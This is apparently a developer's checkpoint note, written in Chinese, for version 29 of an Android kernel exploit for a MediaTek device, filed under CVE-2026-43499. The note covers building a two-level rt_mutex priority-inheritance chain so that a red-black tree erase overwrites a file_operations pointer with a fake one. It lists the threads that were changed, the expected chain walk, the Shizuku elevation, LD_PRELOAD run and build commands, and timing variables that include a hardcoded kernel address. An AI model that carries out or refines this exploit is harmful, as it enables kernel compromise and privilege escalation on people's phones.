# CHECKPOINT — v29 深度 PI Chain 路线

> 时间: 2026-07-15 11:16
> 文件: preload_mtk_v29.so (SHA256: b36060c8...)
> 大小: 163336 bytes
> 基于: v28_fix2 + 深度 PI chain 改动

---

## 核心改动

### 问题
Call 1 用 tree_entry (OFF|RED) → 写 FOPS-8。pi_tree_entry (FOPS-8|RED) 在 Call 2/3 但从未执行，
因为 owner->pi_blocked_on == NULL（链只有一层深度）。

### 解决方案
添加第三个 PI mutex (f_owner_block)，让 owner 阻塞在它上面，创建 2 级 PI chain：
```
block_holder (持有 f_owner_block)
    ↓
owner (持有 f_pi_target, 阻塞在 f_owner_block)
    ↓
waiter (阻塞在 f_pi_target)
```

### 代码改动 (main.c)

1. **新增全局变量**:
   - `uint32_t f_owner_block` — 第三 PI mutex
   - `atomic_int block_holder_ready` — block_holder 就绪信号

2. **新增 block_holder_thread()** (line 115-143):
   - lock f_owner_block → set ready → wait for owner_release_go → unlock

3. **修改 owner_thread()** (line 145-187):
   - 等 block_holder_ready → lock f_pi_target → **block on f_owner_block**
   - (不再 busy-wait usleep 循环)

4. **修改 waiter_thread()** (line 46-52):
   - lock f_pi_target 前等 150ms（确保 owner 已完全阻塞，pi_blocked_on 已设置）

5. **reset_main_route_state()**: 新增 f_owner_block 和 block_holder_ready 重置

6. **run_main_route_threads()**: block_holder 线程最先创建（5 线程并发）

### 预期 PI chain walk
```
rt_mutex_adjust_prio_chain(waiter):
  1. lock = f_pi_target
  2. top_waiter = waiter (GhostLock fake waiter from fd_set)
  3. Call 1: rb_erase tree_entry (tree_pc=OFF|RED)
     → 写 successor/page_base+0x3000 到 FOPS-8
  4. rb_insert_color → waiter 入 pi_waiters
  5. owner = f_pi_target->owner (owner thread)
  6. owner->pi_blocked_on != NULL! (阻塞在 f_owner_block)
     → 继续 chain walk
  7. Call 2: rb_erase pi_tree_entry (pi_parent=FOPS-8|RED, Path A)
     → node->rb_right = fake_fops
     → parent = FOPS-8
     → parent+0x08 = FOPS
     → [FOPS] = fake_fops ✅✅✅
  8. Walk up: f_owner_block → block_holder
  9. block_holder->pi_blocked_on = NULL → chain ends
```

### 运行命令
```bash
# Shizuku 提权
RISH_APPLICATION_ID=com.termux /system/bin/app_process \
  -Djava.class.path=/data/local/tmp/rish_shizuku.dex \
  /system/bin --nice-name=rish rikka.shizuku.shell.ShizukuShellLoader

# 运行
LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10 2>&1

# 编译
cd /mnt/sdcard/Documents/matisse_backup_essentials/CyberMeowfia/IonStack/CVE-2026-43499/exploit
make clean && make PROJECT=matisse-OS2.0.6.0.ULKCNXM API=34 CC=clang
cp build/matisse-OS2.0.6.0.ULKCNXM/bin/preload.so /sdcard/Documents/matisse_backup_essentials/preload_mtk_v29.so
```

### 备用 env var
如果时序有问题，调整延迟：
- `PSELECT_PAT_C0=1` — 回退到 Path A (tree_left=0)，减少副作用
- `PSELECT_TREE_PC=ffffff80028e76e1` — 手动设置 tree_pc=FOPS-8|RED (如果 Call 2/3 仍不执行，可试)
